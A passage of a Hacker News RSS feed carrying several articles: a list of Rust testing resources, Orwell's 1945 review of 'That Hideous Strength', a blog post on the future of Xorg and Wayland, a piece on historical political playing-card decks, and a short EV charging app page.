<a href="https://docs.rs/quickcheck/0.9.2/quickcheck/trait.Arbitrary.html">arbitrary implementation</a></li>
        </ul>
      </li>
      <li><a href="https://docs.rs/proptest">proptest</a>
        <ul>
          <li>has its own
<a href="https://docs.rs/proptest-arbitrary/0.2.2/proptest_arbitrary/">arbitrary implementation</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Unit tests vs integration tests</li>
  <li>Using <a href="https://docs.rs/assert_cmd">assert_cmd</a> crate to test applications
(link has links to other useful crates)</li>
  <li>Better error reporting using one of
    <ul>
      <li><a href="https://docs.rs/anyhow/1.0.33/anyhow/">anyhow crate</a> – adding context to error messages</li>
      <li><a href="https://docs.rs/color-eyre/0.5.6/color_eyre/">color eyre crate</a> –
extends anyhow with .suggestion() and other context</li>
    </ul>
  </li>
  <li>Use the {:?} and {:x?} Debug string formats in test harnesses
(see <a href="https://doc.rust-lang.org/std/fmt/#formatting-traits">std/fmt</a>)</li>
  <li><a href="https://github.com/jakubadamw/rutenspitz">Rutenspitz</a>:
procedural macros for testing (fuzzing) equivalence of two
stateful models (e.g., data structures)</li>
</ul>

<h3 id="test--behavior-driven-design-tdd-and-bdd">Test / Behavior driven design (TDD and BDD)</h3>

<p>See: <a href="https://blog.cyplo.dev/posts/2018/09/rust-testing-tricks/">Rust testing tricks</a>,
<a href="https://mateuscosta.me/testing-between-java-and-rust">From @test to #[test]: Java to Rust</a></p>

<p>Obviously, there are many, many articles about TDD, BDD, Agile, etc.
in the context of Java and other OO languages. The following links are
Rust specific but they are a bit random and need to be improved.</p>

<ul>
  <li><a href="https://crates.io/crates/laboratory">Laboratory.rs</a> –
BDD-inspired test library (todo: are other BDD libraries maybe more popular?)</li>
  <li><a href="https://github.com/utkarshkukreti/speculate.rs">Speculate</a>
RSpec inspired testing library</li>
  <li>Fluent assertions: <a href="https://github.com/cfrancia/spectral">spectral</a>
(last updated 2017)</li>
  <li><a href="https://matthewkmayer.github.io/blag/public/post/tdd-with-rust/">TDD with Rust</a> (2017) –
a small example</li>
  <li>Regression testing (testing against a golden reference) using one of
    <ul>
      <li><a href="https://docs.rs/qtrac-retest/4.0.6/retest/">Retest</a></li>
      <li><a href="https://github.com/mitsuhiko/insta">insta</a></li>
    </ul>
  </li>
</ul>

<h2 id="specific-topics">Specific topics</h2>

<p>Note: links in this section are more likely to be out of date.</p>

<h3 id="code-coverage">Code coverage</h3>

<ul>
  <li><a href="https://crates.io/crates/cov-mark">cov-mark crate</a> –
adding explicit coverage annotations to code
(<a href="https://matklad.github.io/2018/06/18/a-trick-for-test-maintenance.html">blog</a>,
<a href="https://ferrous-systems.com/blog/coverage-marks/">blog</a>)</li>
  <li>Code coverage tools and crates
    <ul>
      <li><a href="https://github.com/mozilla/grcov">Grcov</a> – Mozilla’s coverage tool</li>
      <li><a href="https://github.com/kennytm/cov">cargo-cov</a></li>
      <li><a href="https://crates.io/crates/cargo-tarpaulin">Tarpaulin</a> (x86 only)</li>
    </ul>
  </li>
  <li><a href="https://jbp.io/2017/07/19/measuring-test-coverage-of-rust-programs.html">Measuring test coverage of Rust programs</a>
(I think it is now easier than in 2017?)</li>
  <li><a href="https://sunjay.dev/2016/07/25/rust-code-coverage">Rust Code Coverage Guide: kcov + Travis CI + Codecov / Coveralls</a> (2016)</li>
</ul>

<h3 id="testing-embedded-systems">Testing embedded systems</h3>

<ul>
  <li><a href="https://ferrous-systems.com/blog/cargo-test-with-panic-probe/">Using <code>cargo test</code> for embedded testing with <code>panic-probe</code></a></li>
  <li><a href="https://ferrous-systems.com/blog/defmt/">defmt, a highly efficient Rust logging framework for embedded devices</a>:
a deferred formatting library that encodes I/O over a hardware trace port to reduce binary size on embedded systems</li>
  <li><a href="https://medium.com/@ericdreichert/test-setup-and-teardown-in-rust-without-a-framework-ba32d97aa5ab">Test setup/teardown without a framework</a> –
using <a href="https://doc.rust-lang.org/std/panic/fn.catch_unwind.html">panic::catch_unwind</a></li>
  <li><a href="https://github.com/rust-lang/rfcs/blob/master/text/2318-custom-test-frameworks.md">RFC 2318: Custom test frameworks</a> –
<a href="https://doc.rust-lang.org/beta/unstable-book/language-features/custom-test-frameworks.html">now in unstable</a></li>
  <li><a href="https://os.phil-opp.com/testing/">Writing an OS in Rust: testing</a> (uses custom test frameworks)</li>
  <li><a href="https://github.com/japaric/utest">Utest</a> (is this still active?)</li>
</ul>

<h3 id="concurrency-futures-and-async">Concurrency, futures and async</h3>

<ul>
  <li><a href="https://blog.x5ff.xyz/blog/async-tests-tokio-rust/">Two easy ways to test async functions in Rust</a></li>
  <li><a href="https://rust-lang.github.io/async-book/09_example/03_tests.html">Async book – testing a web server</a></li>
  <li><a href="https://crates.io/crates/tokio-test">Tokio-test</a> for mocking AsyncRead/Write and tasks
(<a href="https://docs.rs/tokio-test/0.3.0/tokio_test/index.html">docs</a>)</li>
  <li><a href="https://github.com/actix/examples/blob/master/hello-world/src/main.rs">actix async example</a></li>
  <li><a href="https://www.lpalmieri.com/posts/2020-08-09-zero-to-production-3-how-to-bootstrap-a-new-rust-web-api-from-scratch/#4-our-first-integration-test">Our first integration test</a> –
Actix_rt::test based chapter in book <a href="https://zero2prod.com/">Zero to production in Rust (book)</a></li>
  <li><a href="https://crates.io/crates/loom">Loom</a> tests concurrent code by
running it many times with all possible thread interleavings</li>
</ul>

<h3 id="testing-frameworks">Testing frameworks</h3>

<ul>
  <li><a href="https://tech.labs.oliverwyman.com/blog/2019/01/14/serialising-rust-tests/">Serializing Rust tests</a>
(<a href="https://github.com/palfrey/serial_test">github</a>) –
annotations to prevent some tests being run in parallel</li>
  <li><a href="https://github.com/budziq/rust-skeptic">Skeptic</a> –
run doctest-like tests on README.md</li>
  <li><a href="https://github.com/Wmaxlees/trust">Trust automated test runner</a>: reruns tests when files change</li>
  <li><a href="https://crates.io/crates/test-case">Test-case</a>
procedural macro to generate tests from test-case annotations</li>
  <li><a href="https://github.com/vitiral/artifact">Artifact (aka RST)</a> –
requirement tracking software where comments in code are linked (in lightweight way) to
requirements, specs and tests in a markdown document</li>
  <li><a href="https://github.com/cksac/fake-rs">Fake.rs</a> –
interesting #derive option to describe how to generate fake values for structs.
Can this be adapted to specify invariants for legal values of a type?</li>
</ul>

<h3 id="testing-guis">Testing GUIs</h3>

<ul>
  <li><a href="https://gtk-rs.org/blog/2018/05/02/who-talked-about-testing.html">Gtk-rs testing</a>:
testing UIs by being able to send events to gtk and observe results</li>
  <li><a href="https://medium.com/snips-ai/dinghy-painless-rust-tests-and-benches-on-ios-and-android-c9f94f81d305">Dinghy: testing iOS and Android</a>:
challenges when you don’t have a command line</li>
</ul>

<h3 id="testing-apis">Testing APIs</h3>

<ul>
  <li><a href="https://github.com/laumann/compiletest-rs">Compiletest.rs</a> – for testing compiler plugins and similar
    <ul>
      <li>In particular, checking that type system (etc) rejects misuse of APIs:
<a href="http://erickt.github.io/blog/2015/09/22/if-you-use-unsafe/">If you use unsafe …</a></li>
    </ul>
  </li>
  <li><a href="https://rust-lang.github.io/api-guidelines/about.html">Rust API guidelines</a>
(not so much about testing here – but useful)</li>
</ul>

<h3 id="mutation-testing">Mutation testing</h3>

<ul>
  <li><a href="https://github.com/llogiq/mutagen">Mutagen</a> –
mutation testing tool implemented using procedural macros</li>
</ul>

<h3 id="test-generation">Test generation</h3>

<ul>
  <li><a href="https://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html">Writing a testcase generator for a programming language</a>
Generate random wasm with “wasm-smith” in Rust</li>
</ul>

<h3 id="mocking-libraries">Mocking libraries</h3>

<p>There are <em>a lot</em> of mocking / faking libraries – this is a limited
list of what I found.</p>

<ul>
  <li><a href="https://asomers.github.io/mock_shootout/">Rust mock shootout</a>:
a fairly thorough survey of Rust mocking libraries.
This lead to the development of
<a href="https://github.com/asomers/mockall">mockall</a>
that is one of (the?) most popular mocking library.</li>
  <li><a href="https://github.com/asomers/mockall">mockall</a> mocking library</li>
  <li><a href="https://github.com/CodeSandwich/Mocktopus">mocktopus</a></li>
  <li><a href="https://docs.rs/httpmock/0.5.0/httpmock/">Httpmock</a></li>
  <li><a href="https://lib.rs/crates/partial-io">Partial-io</a>
wraps Read/Write implementations, optional Future and quickcheck support</li>
</ul>

<h3 id="error-handling">Error handling</h3>

<p>See:
<a href="https://rust-cli.github.io/book/tutorial/errors.html">CLI applications in Rust</a>,
<a href="https://nick.groenen.me/posts/rust-error-handling/">Structuring and using errors in 2020</a></p>

<p>Not quite about testing – but semi-relevant.</p>

<ul>
  <li>Use of ?</li>
  <li><a href="https://docs.rs/anyhow/1.0.33/anyhow/">Anyhow</a> – adding context to error messages</li>
  <li><a href="https://blog.yoshuawuyts.com/error-handling-survey/">Error handling survey</a></li>
</ul>

<h3 id="misc">Misc</h3>

<ul>
  <li>kruetz on reddit
<a href="https://www.reddit.com/r/rust/comments/jl2xlg/rust_designfortestability_a_survey/ganb86b?utm_source=share&amp;utm_medium=web2x&amp;context=3">described how he checks that code in mdbooks compiles correctly</a></li>
</ul>

<h2 id="more-information">More information</h2>
</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://alastairreid.github.io/rust-testability/">https://alastairreid.github.io/rust-testability/</a></em></p>]]>
            </description>
            <link>https://alastairreid.github.io/rust-testability/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945657</guid>
            <pubDate>Fri, 30 Oct 2020 19:00:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Scientists Take Over: George Orwell Reviews “That Hideous Strength” (1945)]]>
            </title>
            <description>
<![CDATA[
Score 89 | Comments 55 (<a href="https://news.ycombinator.com/item?id=24945608">thread link</a>) | @benbreen
<br/>
October 30, 2020 | http://lewisiana.nl/orwell/index.htm | <a href="https://web.archive.org/web/*/http://lewisiana.nl/orwell/index.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>







<p><b><span lang="EN-US">George
Orwell’s review of C. S. Lewis, <i>That
Hideous Strength</i> (1945)<o:p></o:p></span></b></p>



<p><span lang="EN-US">THE SCIENTISTS TAKE OVER<o:p></o:p></span></p>

<p><b><i><span lang="EN-US">Manchester Evening News</span></i></b><b><span lang="EN-US">, 16 August 1945. </span></b><span lang="EN-US">Reprinted in <i>The Complete Works of George Orwell</i>, ed. Peter Davison,
Vol. XVII (1998), No. 2720 (first half), pp. 250–251<o:p></o:p></span></p>











<p><span lang="EN-GB">On</span><span lang="EN-US"> the whole, novels are better when there are no
miracles in them. Still, it is possible to think of a fairly large number of worth-while
books in which ghosts, magic, second-sight, angels, mermaids, and what-not play
a part.<o:p></o:p></span></p>

<p><span lang="EN-US">Mr. C. S. Lewis’s “That Hideous Strength” can be included in their number –
though, curiously enough, it would probably have been a better book if the
magical element had been left out. For in essence it is a crime story, and the
miraculous happenings, though they grow more frequent towards the end, are not
integral to it.<o:p></o:p></span></p>

<p><span lang="EN-US">In general outline, and to some extent in atmosphere, it rather resembles
G. K. Chesterton’s “The Man Who Was Thursday.”<o:p></o:p></span></p>

<p><span lang="EN-US">Mr. Lewis probably owes something to Chesterton as a writer, and certainly
shares his horror of modern machine <span>civilisation</span> (the
title of the book, by the way, is taken from a poem about the Tower of Babel)
and his reliance on the “eternal verities” of the Christian Church, as against
scientific materialism or nihilism.<o:p></o:p></span></p>

<p><span lang="EN-US">His book describes the struggle of a little group of sane people against a
nightmare that nearly conquers the world. A company of mad scientists – or,
perhaps, they are not mad, but have merely destroyed in themselves all human
feeling, all notion of good and evil – are plotting to conquer Britain, then
the whole planet, and then other planets, until they have brought the universe
under their control.<o:p></o:p></span></p>

<p><span lang="EN-US">All superfluous life is to be wiped out, all natural forces tamed, the
common people are to be used as slaves and vivisection subjects by the ruling
caste of scientists, who even see their way to conferring immortal life upon
themselves. Man, in short, is to storm the heavens and overthrow the gods, or
even to become a god himself.<o:p></o:p></span></p>

<p><span lang="EN-US">There is nothing outrageously improbable in such a conspiracy. Indeed, at a
moment when a single atomic bomb – of a type already pronounced “obsolete” –
has just blown probably three hundred thousand people to fragments, it sounds
all too topical. Plenty of people in our age do entertain the monstrous dreams
of power that Mr. Lewis attributes to his characters, and we are within sight
of the time when such dreams will be <span>realisable</span>.<o:p></o:p></span></p>

<p><span lang="EN-US">His description of the N.I.C.E. (National Institute of Co-ordinated
Experiments), with its world-wide ramifications, its private army, its secret
torture chambers, and its inner ring of adepts ruled over by a mysterious
personage known as The Head, is as exciting as any detective story.<o:p></o:p></span></p>

<p><span lang="EN-US">It would be a very hardened reader who would not experience a thrill on
learning that The Head is actually – however, that would be giving the game
away.<o:p></o:p></span></p>

<p><span lang="EN-US">One could recommend this book unreservedly if Mr. Lewis had succeeded in keeping
it all on a single level. Unfortunately, the supernatural keeps breaking in,
and it does so in rather confusing, undisciplined ways. The scientists are <span>endeavouring</span>, among other things, to get hold of the body
of the ancient Celtic magician Merlin, who has been buried – not dead, but in a
trance – for the last 1,500 years, in hopes of learning from him the secrets of
pre-Christian magic.<o:p></o:p></span></p>

<p><span lang="EN-US">They are frustrated by a character who is only doubtfully a human being,
having spent part of his time on another planet where he has been gifted with
eternal youth. Then there is a woman with second sight, one or two ghosts, and
various superhuman visitors from outer space, some of them with rather tiresome
names which derive from earlier books of Mr. Lewis’s. The book ends in a way
that is so preposterous that it does not even succeed in being horrible in
spite of much bloodshed.<o:p></o:p></span></p>

<p><span lang="EN-US">Much is made of the fact that the scientists are actually in touch with
evil spirits, although this fact is known only to the inmost circle. Mr. Lewis
appears to believe in the existence of such spirits, and of benevolent ones as
well. He is entitled to his beliefs, but they weaken his story, not only
because they offend the average reader’s sense of probability but because in
effect they decide the issue in advance. When one is told that God and the
Devil are in conflict one always knows which side is going to win. The whole
drama of the struggle against evil lies in the fact that one does not have
supernatural aid. However, by the standard of the novels appearing nowadays
this is a book worth reading.<o:p></o:p></span></p>







</div></div>]]>
            </description>
            <link>http://lewisiana.nl/orwell/index.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945608</guid>
            <pubDate>Fri, 30 Oct 2020 18:55:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Neighbourly Solution to the 'X Is Deprecated? ' Conundrum]]>
            </title>
            <description>
<![CDATA[
Score 58 | Comments 33 (<a href="https://news.ycombinator.com/item?id=24945538">thread link</a>) | @zdw
<br/>
October 30, 2020 | https://www.divergent-desktop.org/blog/2020/10/29/improving-x/ | <a href="https://web.archive.org/web/*/https://www.divergent-desktop.org/blog/2020/10/29/improving-x/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <div>
        <article lang="en">
          
          <p>Recent posts about the state of Xorg and its future has been stirring the
internets as of late and, as almost always, it is best to stay clear of the
comments sections. The more insightful post is <a href="https://ajaxnwnk.blogspot.com/2020/10/on-abandoning-x-server.html">On Abandoning the X Server</a>.</p>

<p>There are a few details in it that should be emphasised before we move on.</p>

<div><div><pre><blockquote>Though the code happens to implement an unfortunate
specification, the code itself is quite well structured, easy to hack on, and
not far off from being easily embeddable.</blockquote></pre></div></div>

<p>From my own experiences with Xorg internals, I agree completely. A whole lot
of the code there is noticably better than corresponding paths in certain
Wayland compositors. There is more thought; domain expertise; engineering and
pure elbow grease behind it than you might have been led to believe -- if you
have only listened in to the collective moans in various discussion groups.</p>

<div><div><pre><blockquote>So is Xorg abandoned? To the extent that means using it to actually
control the display, and not just keep X apps running, I'd say yes. But xserver
is more than xfree86. Xwayland, Xwin, Xephyr, Xvnc, Xvfb: these are projects
with real value that we should not give up. A better way to say it is that we
can finally abandon xfree86.</blockquote></pre></div></div>

<p>There are some nuances here that many will miss as it requires you to know
something about the architecture of the X server. The main thing is to not
conflate ‘xfree86’ with rest of what you think of as X, hence why the blog post
separates out XFree86-the-project from 'xfree86 the hardware driver'. It is
unfortunate that the predecessor to Xorg was also called XFree86. Naming
things is hard and all that.</p>

<p>If you look at the xorg code, recommended reading for many who can
understand the language, you will see that the device-dependent code used to
drive displays (hw/ in the source tree) has a few backends, mentioned above.
Venture into the hw/xfree86 part and you will hopefully see why Adam Jackson
and others deserve the software engineering equivalent of a Purple Heart for
their service to your desktop, possibly alongside anyone that ever had to work
on ASN.1.</p>

<p>
<i>Rightfully throw Xorg-xfree86 into the fires of Mt. Doom. If you
still need Xorg-xfree86 to be your graphics card driver, you have bigger things
to worry about, such as plain old bitrot.</i></p>

<p>Is there something else? Yes. I’m not going to say <a href="https://arcan-fe.com/">Arcan</a> – it is <i>very</i> likely that there
is only a small percentage of the stakeholders we would ever get along with.
That is fine. The goals and agenda reach much further than many will ever care
to travel -- unless you really want to push the boundaries of computing, or you
are actively targeted by nefarious individuals; our funding is not based on
popularity or mass adoption, but rather sticking to the shadows.</p>

<h2>The Compromise</h2>
<p>So what can we do instead? The current Wayland maintainer has
<a href="https://github.com/emersion/libliftoff">libliftoff</a> for smoothing
over the rather ‘unergonomic’ APIs that are used to get the open, modern,
graphics stack up and running. <em>Write a DDX backend that uses it.
hw/liftoff!</em></p>

<p>This will get liftoff the lift-off and mileage it needs to become good
enough for Wayland compositors to use as their default, and as a slightly more
polite migration path in order for NVIDIA to be less contemptible in the
unlikely event that they are one day struck by some capitalist version of
religious insight. Thus, it improves parts of the Wayland compositor situation
that is, politely put, chaotic.</p>

<p>Those that don’t care about what Wayland tries to achieve can stay with X and
not worry about their graphics breaking after a kernel update, or well, more
than usual -- Linux gotta Linux. NVIDIA blob users can continue down that path
and stop bothering Wayland developers, yet still run their Steam games without
submitting to open source ideals.</p>

<p>Next steps. This is for the window managers. Take libarcan-shmif-server and
embed as a module in Xorg, fork it off even. If you are unaware, this is the
IPC system part of Arcan. Both the server and the client sides of it are fairly
trivial to use and are written with developers, not toolkits, in mind.</p>

<p>It is beyond feature parity with the rest of X, but has a comparable view on
capabilities and division of responsibility. You will only get a fraction of
the benefits of Arcan as a display server, but without other dependencies or
friction - many of the problems that X clients are plagued with can be worked
around while leaving the X11 protocol and its family of extensions to rest.
Hacks relying on facilities like uinput can be put down.</p>

<p>The security around these clients will be much tighter and they can be
gradually tuned to the specification of the developer. It lets XFCE, AwesomeWM,
WindowMaker and the tens to hundreds of others WM projects to continue to
improve their respective ecosystems, specialized widgets and other tools,
rather than to burn resources they don't have to rewrite themselves with bugs
that won't be discovered or fixed in time to matter.</p>

<p>It also gives the conservative side of BSDs a portable way of improving
their use of the graphics stack without reworking fundamentals they care little
about. The OpenBSD fork 'Xenocara' can be dropped.</p>

<p>This way, the heritage is preserved and kept alive, with a band aid to live
out another decade or three. It will still work for the marginalized that have
little interest- or option- in going elsewhere. It will be less painful to
maintain and work with.</p>

<h2>The Reality</h2>
<p>Wayland only is not an option that will ever work across the board. It is
not a replacement, it is a fundamental change of principles. Stop trying to
market it as some kind of inevitable transition. There are strong differences
that will not get smoothed over regardless of how many 'protocols' you define;
<i>Wayland is Policy over Mechanism, X11 is Mechanism over Policy</i>. This is
the real barrier. Not unsubstantiated claims of 'security'. It is a tectonic
shift and no matter your feelings about that, we won't all be in the same
country or continent anymore.</p>

<p>Heralding a 'Screenshot Protocol' and similar exercises as the fix that will
bridge this gap will only serve to distract from the fact that the power of all
these little tools and hacks from the crowd of X11 users comes from the
'screenshot' being just one case of <i>'give me the contents of a specific
window and all of its children'</i> or <i>'composite these windows to an
offscreen buffer and send me the results'</i> as the building blocks
available to be creative with.

</p><p>The mechanism approach provides a huge set of possibilities and opens up for
experimentation and 'works for me' kind of hacks. The downside is that it
surrenders control on the server side and are much harder to make robust.</p>

<p>The policy aproach will only do what both sides agree to, and <i>that
	agreement has the final say</i>. If you violate this contract, you are to be
blamed. However, that contract has to be bikeshedded to near state-space
exhaustion and carefully screened for conflicts as more contracts are added to
the pile.</p>

<p>The current trajectory is Gnomelanders and Swaylanders and Kwinners and so
on continuing to lock down singular uses cases and with political gunplay try
to push that as the one solution that will convince a few more bread crumbs.
The hand that controls the toolkit will eventually just decide. <i> This will
erode the strength of the policy contract</i>.</p>

<p>This has already led to a substantial amount of dissonance -- it turns out
that the 'opting-server-side decoration protocol' in the mix had implications
for how to interpret the 'subsurface protocol' and the 'redshift gamma
protocol' will clash with whatever 'color management protocol' that materialize
and so on. To get a feel for how involved such policies become, just <a href="https://github.com/wayland-project/wayland-protocols/blob/3a74660e94d85fde24f504cc9d4375d42192e84a/stable/xdg-shell/xdg-shell.xml#L402">
read the specification</a> and you will see why no implementation arrives at
the same calculation.</p>

<p>Take the perspective of a client developer chasing after the tumbleweed of
'protocols' drifting around and try to answer 'what am I supposed to implement
and use'? To me it looked like like a Picasso painting of ill-fitting- and
internally conflicted ideas. Let this continue a few cycles more and X11 will
look clean and balanced by comparison. Someone should propose a desktop icon
protocol for the sake of it, then again, someone probably already has.</p>

<h2>In Conclusion</h2>
<p>This approach will force Wayland to demonstrate its worth through the
virtues of its properties alone or by inventing actually compelling features
rather than by throwing shade on the elderly; or reimplementing the past
through rebranded and traced outlines from shadows cast by grander window
managers of yore.</p>

<p>The proposal leaves us with three well-defined paths.</p>

<ul>
<li>Wayland lets your own solipsist thiefdoms expand towards the horizon,
while trying to save embedded from the Android expanse.</li>
<li>People that have invested their hearts and souls into the X ecosystem can
continue to use their computers without fear of a kernel upgrade leaving them
with broken graphics, or a switch of display server paradigm leaving them with
an incompatible mental model of how system graphics work, and perhaps, one day,
stop whining about Wayland ruining their day and leave the devs alone.</li>
<li>Arcan lets you play with crazy ideas at a low initial cost. The ones
that might revolutionise your world or fail miserably. It will continue to
pushing things towards whatever is beyond the Twilight Zone in order to answer
profound questions such as 'what happens to productivity if your heartbeat
aligns with the blink rate of the cursor' (well that's actually be done since
forever and the RESULTS WOULD SHOCK YOU! - but it still illustrates the
point).</li>
</ul>

<p>It might even turn out so well that one of these paths will have a
fighting chance against the open desktop being further marginalised as a thin
client in the Azure clouded future; nothing more than a silhouette behind
unwashed Windows, a virtualized ghost of its former self.</p>

        </article>
	     </div>
     </div></div>]]>
            </description>
            <link>https://www.divergent-desktop.org/blog/2020/10/29/improving-x/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945538</guid>
            <pubDate>Fri, 30 Oct 2020 18:45:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Political Playing Cards over the Centuries]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24945531">thread link</a>) | @tapneal
<br/>
October 30, 2020 | https://solitaired.com/political-card-decks-over-the-centuries | <a href="https://web.archive.org/web/*/https://solitaired.com/political-card-decks-over-the-centuries">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Playing cards have been around for much longer than any of us think. Even though the cards we use today are relatively recent, the earliest records of playing cards date back to the Tan dynasty around the 9th century AD. Even though card games were called leaf games back in 868AD when princess Tongchang played with them, the concept remains the same.</p>
<p>Playing card design has been used as a means of political expressions over the centuries, and represent a glimpse into political feelings of the time. Weâ€™ve compiled some of the most interesting political decks below. </p>
<h3 id="1973politicalplayingcards">1973 Political Playing Cards</h3>
<p>Released by Fournier in 1973, the deck contains humorist drawings of politicians and other kinds of leaders from the 20th century, including religious leaders, despots, dictators, presidents, and more.
<img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/spain.jpg"></p>
<h3 id="antifascistpropaganda">Anti-Fascist Propaganda</h3>
<p>An anti-fascist card deck from 1943, designed and printed by order of Stalin with a goal of making fun of the German empire from that era.
<img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/antifacist.png"></p>
<h3 id="antinapoleon">Anti-Napoleon</h3>
<p>Most likely German-made around 1815, this deck of cards was designed and printed to portray the liberation war between Napoleon and the opposing forces.
<img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/napoleon.png"></p>
<h3 id="backtotheussr">Back to the USSR</h3>
<p>Designed and printed mainly for the Russian market back in 1995, the cards portray the most popular leaders and politicians from USSR history.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/ussr.png"></p>
<h3 id="bicyclecivilwardeck">Bicycle Civil War Deck</h3>
<p>Aimed at showing important historical characters from the American civil war era, these playing cards are relatively new and came into production in 2017. <a href="https://www.wopc.co.uk/usa/uspcc/bicycle-civil-war" rel="â€�nofollowâ€�">Check it out.</a></p>
<h3 id="cartesimperialesetroyales">Cartes Imperiales et Royales</h3>
<p>Going back to the mid-19th century, we have cards that show consorts and imperial rulers from England, Austria, France, and Russia.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/royals.png"></p>
<h3 id="churchillinww2">Churchill in WW2</h3>
<p>An entire deck dedicated to Winston Churchill in World War 2 shows him in multiple positions as an officer, politician, writer, and salesman.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/church.png"></p>
<h3 id="dutchroyalfamily1879">Dutch Royal Family 1879</h3>
<p>A deck of cards dedicated to King William III's second marriage to Princess Emma of Waldeck-Pyrmont, where most of the cards consist of Dutch Royalty and soldiers.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/dutch.png"></p>
<h3 id="imperialroyalpack">Imperial Royal Pack</h3>
<p>Published in London in 1828, the Imperial Royal Pack contains portraits of important people from the Spanish, Turkish, French, and English empires.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/imperial.png"></p>
<h3 id="frenchrevolution">French Revolution</h3>
<p>A French Revolution deck printed in 1793 on woodblocks with stencils coloring showing the plain old people of France, including farmers and philosophers.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/french.png"></p>
<h3 id="satireofolivercromwellsgovernmentfrom1679">Satire of Oliver Cromwellâ€™s Government from 1679</h3>
<p>Quite older than most here, this desk was engraved and was intended to mock the government of Oliver Cromwell during the Rump Parliament era.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/cromwell.png"></p>
<h3 id="tripoliwar1815">Tripoli War 1815</h3>
<p>A scarce set of cards, printed around 1815 and designed with courts that aimed to commemorate the Tripoli War. <a href="https://www.potterauctions.com/pdf/Catalog_048_WEB.pdf" rel="â€�nofollowâ€�">Learn more</a></p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/tripoli.png"></p>
<h3 id="mortimernelsoncivilwarconfederategenerals">Mortimer Nelson Civil War Confederate Generals</h3>
<p>52 card deck designed and printed in 1863 with the goal of painting a picture of the Confederate officers or officials from that era. <a href="https://www.potterauctions.com/pdf/Catalog_048_WEB.pdf" rel="â€œnofollowâ€�">Learn more</a>.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/civilwar.png"></p>
<h3 id="ahcaffeecomicalpoliticalplayingcards1888onpresidentialelection">A.H. Caffee Comical Political Playing Cards 1888 on Presidential Election</h3>
<p>This deck of cards was designed and printed back in 1888 to honor Cleveland and Harrison's contest for president. <a href="https://www.potterauctions.com/pdf/Catalog_048_WEB.pdf" rel="â€œnofollowâ€�">Learn more</a>.</p>
<h3 id="biermansworldwariplayingcards1915">Biermans World War I Playing Cards 1915</h3>
<p>Printed and designed by Biermans in 1915, the cards were supposed to paint a satirical picture of the German military's politicians and army personnel. <a href="https://www.potterauctions.com/pdf/Catalog_048_WEB.pdf" rel="â€œnofollowâ€�">Learn more</a>.
<img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/ww1.png"></p>
<h3 id="ww1commemorative">WW1 Commemorative</h3>
<p>To celebrate the victory in World War 1, Belgium printed these cards to commemorate presidents, kings, and queens as well as generals from their allying countries.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/ww1c.png"></p>
<h3 id="kennedykards">Kennedy Kards</h3>
<p>Humor House released the cards in 1963, showing all Kennedy family members as well as JFK's successor president, LBJ.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/kennedy.jpg"></p>
<p>Many of these decks were found on <a href="https://www.wopc.co.uk/" rel="â€œnofollowâ€�">World of Playing Cards</a>, a great resource for historical playing card. </p></div></div></div></div>]]>
            </description>
            <link>https://solitaired.com/political-card-decks-over-the-centuries</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945531</guid>
            <pubDate>Fri, 30 Oct 2020 18:45:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Waze for EV Drivers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945456">thread link</a>) | @mo3elm
<br/>
October 30, 2020 | https://bauenmotors.com/chargeApp | <a href="https://web.archive.org/web/*/https://bauenmotors.com/chargeApp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="services">
        <div>
        <p> Why Charge App?</p>
        <p>Smart. Personal. And its free.</p>
            <center>
            <div>
                    <div>
                        <div>
                            <p><img src="https://bauenmotors.com/imgs/route-chargeApp.png"></p><p>Personalized trip <br>planning</p>
                            
                        </div>
                        <div>
                            <p><img src="https://bauenmotors.com/imgs/locationInfo-chargeApp.png"></p><p>Always up to date station <br> information</p>
                        </div>
                        <div>
                            <p><img src="https://bauenmotors.com/imgs/ai-chargeApp.png"></p><p>AI-based charge <br>recommendation</p>
                        </div>
                    </div>
                </div>
            </center>
        
        </div>
    </section></div>]]>
            </description>
            <link>https://bauenmotors.com/chargeApp</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945456</guid>
            <pubDate>Fri, 30 Oct 2020 18:37:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The time to write has come]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945404">thread link</a>) | @lassmaglio
<br/>
